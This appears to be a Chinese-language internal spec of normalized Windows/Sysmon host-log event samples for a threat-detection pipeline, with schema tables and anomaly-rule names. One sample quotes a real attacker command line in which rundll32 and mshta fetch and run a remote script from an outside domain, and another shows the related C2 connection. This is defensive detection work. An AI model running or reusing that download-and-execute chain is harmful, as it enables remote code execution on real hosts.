# 给A：主机日志标准事件样例 v2（数据100%来自真实日志解析）

> **✅ 已对齐 Event V2（2026-09-07契约冻结）**：19字段、source枚举6值、ISO8601 T分隔时间戳、detail注册表键名、null语义，全部按V2执行。**event_type已按D《Event V2 event_type 规范》对齐**（login_failed/process_start/network_connection等）。
> **数据来源声明**：以下每条JSON都是解析器从真实攻击样本日志（GitHub: sbousseaden/EVTX-ATTACK-SAMPLES，含ATT&CK标注）里**解析输出的原文**，不是手编的。解析代码在 `b_host_parser/`（schema.py 是契约代码版），随时可以现场跑给你看。
> **空值语义（回应你说的"不要塑料花"）**：没有的数据一律 `null`，绝不填 "unknown"/0/""。每条样例里哪些字段是null、为什么null，我都标了原因。

---

## 一、5条核心样例

### ① 登录成功——远程网络登录（4624，有真实源IP）

```json
{
  "timestamp": "2019-03-19T06:15:49.692402+08:00",
  "host": "WIN-77LTAPHIQ1R.example.corp",
  "source": "windows_evtx",
  "event_id": 4624,
  "event_type": "login_success",
  "user": "user01",
  "process": null,
  "src_ip": "10.0.2.17",
  "dst_ip": null,
  "dst_port": null,
  "protocol": null,
  "logon_type": 3,
  "session_id": "WIN-77LTAPHIQ1R.example.corp:0x0000000000110085",
  "cmdline": null,
  "detail": { "logon_id": "0x0000000000110085", "domain": "EXAMPLE", "src_port": "49249" },
  "description": "用户 user01 登录成功（网络登录(共享/IPC)）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> null原因：`process`=null——Kerberos网络登录原始日志里该字段是"-"；`dst_*`=null——登录事件的"目的地"就是本机，网络事件才有目的侧。`session_id` 是后面用4634注销事件重建会话的配对键。

### ② 登录失败（4625，SubStatus区分爆破/用户名枚举）

```json
{
  "timestamp": "2020-09-09T21:18:23.627951+08:00",
  "host": "MSEDGEWIN10",
  "source": "windows_evtx",
  "event_id": 4625,
  "event_type": "login_failed",
  "user": "IEUser",
  "process": "chrome.exe",
  "src_ip": null,
  "dst_ip": null,
  "dst_port": null,
  "protocol": null,
  "logon_type": 2,
  "session_id": null,
  "cmdline": null,
  "detail": { "substatus": "0xc000006a", "substatus_desc": "密码错误", "failure_reason": "%%2313", "workstation": "MSEDGEWIN10" },
  "description": "用户 IEUser 登录失败（交互式登录(本地键盘)，原因: 密码错误）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> null原因：`src_ip`=null——这是**本地交互登录**（LogonType 2），Windows原始日志里IpAddress就是"-"。远程登录失败（类型3/10）会有src_ip。

### ③ 进程创建——4688（没装Sysmon时的兜底来源）

```json
{
  "timestamp": "2019-03-19T06:15:49.645889+08:00",
  "host": "WIN-77LTAPHIQ1R.example.corp",
  "source": "windows_evtx",
  "event_id": 4688,
  "event_type": "process_start",
  "user": "WIN-77LTAPHIQ1R$",
  "process": "WmiPrvSE.exe",
  "src_ip": null,
  "dst_ip": null,
  "dst_port": null,
  "protocol": null,
  "logon_type": null,
  "session_id": null,
  "cmdline": null,
  "detail": { "parent_process": null, "creator_process_id": "0x0000000000000248", "new_process_id": "0x0000000000000ae8", "token_elevation": "%%1936" },
  "description": "进程创建: WmiPrvSE.exe（发起用户: WIN-77LTAPHIQ1R$，父进程: 无记录）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> **诚实披露**：`cmdline`=null 是因为这台机器没开"进程创建命令行审核策略"，4688本来就不带命令行；`parent_process`=null 是因为老版本Windows的4688没有父进程字段。**这两个字段要-rich，请看④的Sysmon 1**——这就是为什么E的靶机强烈建议装Sysmon。另外注意 `WIN-77LTAPHIQ1R$` 结尾带$是机器账号，不是真人。

### ④ 进程创建——Sysmon ID 1（有完整命令行+父进程，攻击者行为全在这）

```json
{
  "timestamp": "2019-05-21T23:32:57.286253+08:00",
  "host": "IEWIN7",
  "source": "sysmon",
  "event_id": 1,
  "event_type": "process_start",
  "user": "IEWIN7\\IEUser",
  "process": "cmd.exe",
  "src_ip": null,
  "dst_ip": null,
  "dst_port": null,
  "protocol": null,
  "logon_type": null,
  "session_id": null,
  "cmdline": "cmd.exe  /C rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WScript.Shell\").run(\"mshta https://hotelesms.com/talsk.txt\",0,true);",
  "detail": {
    "parent_process": "cmd.exe",
    "parent_cmdline": "\"cmd.exe\" /s /k pushd \"C:\\Users\\IEUser\\Desktop\"",
    "hashes": "SHA1=EE8CBF12...,MD5=AD7B9C14...,SHA256=17F746D8...,(完整值见raw_log)"
  },
  "description": "进程创建: cmd.exe（父进程: cmd.exe）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> 这是真实攻击样本：rundll32加载mshtml跑JS，再mshta下载 `hotelesms.com/talsk.txt`——典型的lolbin攻击链，D的关联分析和"异常预标记"规则（remote_download）直接吃这个cmdline。

### ⑤ 文件创建——Sysmon ID 11（计划任务持久化痕迹）

```json
{
  "timestamp": "2019-05-21T23:32:59.809883+08:00",
  "host": "IEWIN7",
  "source": "sysmon",
  "event_id": 11,
  "event_type": "file_create",
  "user": null,
  "process": "svchost.exe",
  "src_ip": null,
  "dst_ip": null,
  "dst_port": null,
  "protocol": null,
  "logon_type": null,
  "session_id": null,
  "cmdline": null,
  "detail": { "file_path": "C:\\Windows\\System32\\Tasks\\MSOFFICE_", "creation_utc_time": "2019-05-21 15:32:59.809" },
  "description": "文件创建: C:\\Windows\\System32\\Tasks\\MSOFFICE_（进程: svchost.exe）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> `C:\Windows\System32\Tasks\` 下创建文件 = 计划任务持久化的典型痕迹。`user`=null 是该样本的Sysmon配置里没启用用户字段采集，如实空缺。

## 二、附录样例

### 附A. 网络连接——Sysmon ID 3（唯一会填 dst_port/protocol 的主机事件，和C的流量字段对齐）

```json
{
  "timestamp": "2019-05-21T23:32:59.389278+08:00",
  "host": "IEWIN7",
  "source": "sysmon",
  "event_id": 3,
  "event_type": "network_connection",
  "user": "IEWIN7\\IEUser",
  "process": "mshta.exe",
  "src_ip": "10.0.2.15",
  "dst_ip": "108.179.232.58",
  "dst_port": 443,
  "protocol": "tcp",
  "logon_type": null,
  "session_id": null,
  "cmdline": null,
  "detail": { "src_port": 49703, "initiated": "True" },
  "description": "主机发起tcp连接 → 108.179.232.58:443（进程: mshta.exe）",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```
> 就是④里那个mshta的C2回连。这条和C的网络事件同构（src_ip/dst_ip/dst_port/protocol都有值），D做"主机↔流量"关联就靠它桥接。

### 附B. 注册表——Sysmon ID 13（隐藏共享持久化）

```json
{
  "timestamp": "2020-10-14T07:06:02.889793+08:00",
  "host": "MSEDGEWIN10",
  "source": "sysmon",
  "event_id": 13,
  "event_type": "registry_set",
  "user": null,
  "process": "svchost.exe",
  "src_ip": null, "dst_ip": null, "dst_port": null, "protocol": null,
  "logon_type": null, "session_id": null, "cmdline": null,
  "detail": { "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Shares\\staging", "registry_value_name": "staging", "registry_value_data": "Binary Data", "registry_operation": "SetValue" },
  "description": "注册表写入: HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Shares\\staging = Binary Data",
  "anomaly_flags": [],
  "severity": 0,
  "raw_log": "<原始XML片段，实际必填，此处省略>"
}
```

## 三、字段可得性清单（建表看这个）

| 档位 | 字段 | 说明 |
|---|---|---|
| **一定有**（每个事件必填） | timestamp, host, source, event_id, event_type, description, raw_log, detail | 空值只可能出现在detail内部 |
| **按事件类型有** | user, process, src_ip, logon_type, session_id, cmdline, dst_ip, dst_port, protocol | 见下方"谁有什么"；没有就null |
| **规则引擎填**（Day2已实现） | anomaly_flags, severity | 解析后统一跑规则引擎：命中则`anomaly_flags=["规则名",...]`、`severity=2或3`；未命中恒为 `[]` 和 `0`（0=未标记异常，合法域值非占位） |

各字段"谁有"速查：

| 字段 | 4624/4625 | 4688 | 4634/4647 | Sysmon1 | Sysmon3 | Sysmon11 | Sysmon13 |
|---|---|---|---|---|---|---|---|
| user | ✓ | ✓ | ✓ | ✓ | ✓ | 配置决定 | 配置决定 |
| process | ✓ | ✓ | — | ✓ | ✓ | ✓ | ✓ |
| src_ip | 远程登录才有 | — | — | — | ✓ | — | — |
| logon_type | ✓ | — | 4634有 | — | — | — | — |
| session_id | 4624有 | — | ✓（与4624同键） | — | — | — | — |
| cmdline | — | 看审核策略 | — | ✓ | — | — | — |
| dst_ip/dst_port/protocol | — | — | — | — | ✓ | — | — |
| detail关键内容 | substatus/域名/源端口 | 父进程/新PID | logon_id/域名 | 父进程+父cmdline+哈希 | 源端口 | 文件路径 | 注册表键值 |

（✓=有值；—=该事件类型本来就没有，恒null）

### detail 键报备清单（V2规定"例如"非穷举，以下是我实际产出的全部键，D取数对照用）

| 事件 | detail键 |
|---|---|
| 4624 登录成功 | `logon_id`、`domain`、`src_port`（IpPort是源端口，故放detail不冒充dst_port）；会话重建后追加 `logout_time`、`session_duration_s` 或 `session_state="active"` |
| 4625 登录失败 | `substatus`、`substatus_desc`（人话：密码错误/用户不存在等）、`failure_reason`、`workstation` |
| 4634/4647 注销 | `logon_id`、`domain`；配对成功追加 `login_time`、`session_duration_s`，孤儿注销追加 `session_state="no_login_record"` |
| 4688 进程创建 | `parent_process`、`creator_process_id`、`new_process_id`、`token_elevation` |
| 1102 日志清除 | `domain` |
| 4720 新建账号 | `target_user`、`target_sid`、`target_domain`、`creator` |
| 4728 成员加入组 | `target_user`（被加进组的成员）、`group_name`、`member_sid`、`group_domain`（⚠️4728原始字段TargetUserName是**组名**） |
| 4673 权限使用 | `privileges`、`object_server`、`object_name`、`service_name` |
| 7045 服务安装 | `service_name`、`service_file`、`service_type`、`start_type`、`account` |
| 4698 计划任务创建 | `task_name`、`task_content` |
| Linux sshd登录 | `method`（password/publickey）、`src_port`、`invalid_user`（"invalid user"前缀=用户不存在，Linux版的用户名枚举指纹） |
| Linux sudo USER_CMD | `sudo_command`（HEX解码后）、`cwd`、`terminal`、`res`、`uid`、`auid`、`audit_serial` |
| Linux execve | `exe`、`ppid`、`audit_key`（E的审计规则名如case01_process_exec）、`audit_serial` |
| Linux 文件访问 | `file_path`（相对路径已拼CWD）、`syscall`（open/openat）、`audit_key`、`comm`、`audit_serial` |
| Linux 网络连接 | `syscall`（connect/accept）、`addr_family`（inet/inet6）、`src_port`（accept时对端端口）、`audit_serial` |
| Linux SERVICE_START/STOP | `service_name`（systemd unit名）、`res`、`audit_serial` |
| Sysmon 1 进程创建 | `parent_process`、`parent_cmdline`、`hashes` |
| Sysmon 3 网络连接 | `src_port`、`initiated` |
| Sysmon 11 文件创建 | `file_path`、`creation_utc_time` |
| Sysmon 13 注册表 | `registry_key`、`registry_value_name`、`registry_value_data`、`registry_operation`（V2统一命名） |

### 待A拍板的一件事

时间戳我保留了**微秒**（如 `2019-03-19T06:15:49.692402+08:00`，ISO8601合法，evtx里本来就是微秒精度的真实数据）。你的示例只写到秒——如果后端标准化要截断到秒，你那边处理即可，我这边不截（截了就丢真实精度）。

## 四、Schema统一建议（请你定夺）

1. **公共字段建议在 timestamp/host/event_type/description 基础上增加**：`source`（区分windows_evtx/sysmon/linux_*，排查数据问题必需）、`event_id`（溯源到原始日志）、`user`（登录/进程的核心实体，D必用）、`raw_log`（前端"查证据"直接展示原文）、`detail`（JSON字符串列，放各类日志的特有字段，避免为每个小字段建列）。
2. **网络侧对齐**：我这边契约已加 `dst_port`/`protocol`，只有Sysmon ID 3会填（见附A），主机登录类恒null。4624里的IpPort是**源**端口，我放在 `detail.src_port`，没有冒充dst_port。
3. **null语义**：`=null` 表示"该事件类型本来就没有这个数据"；不使用 "unknown"/0/空字符串。如果你那边DB列有NOT NULL约束，改列约束，我这边不改数据。
4. **异常预标记**：`anomaly_flags`(数组)+`severity`(0-3) 由我在解析侧按规则填（凌晨登录/爆破/编码执行等，Day2），D的关联引擎也可以直接用。规则名清单见《数据格式契约-v1.md》。

## 五、异常预标记（Day2已实现）

规则引擎在解析后统一跑，命中的事件 `anomaly_flags` 非空、`severity` 取最高级：

```json
{
  "event_type": "login_failed",
  "user": "Administrator",
  "src_ip": "10.0.2.17",
  "anomaly_flags": ["brute_force"],
  "severity": 3,
  "detail": { "substatus_desc": "密码错误" }
}
```

规则名枚举：`offhour_login / brute_force / username_enumeration / encoded_exec / remote_download`。
severity语义：0=未标记，2=中危（offhour_login/remote_download），3=高危（brute_force/username_enumeration/encoded_exec）。
另：会话重建已实现——4624登录与4634/4647注销按`session_id`配对，登录事件的`detail.logout_time/session_duration_s`可直接查；整批会话汇总另存 `all_sessions.json` 供D做横向移动分析。
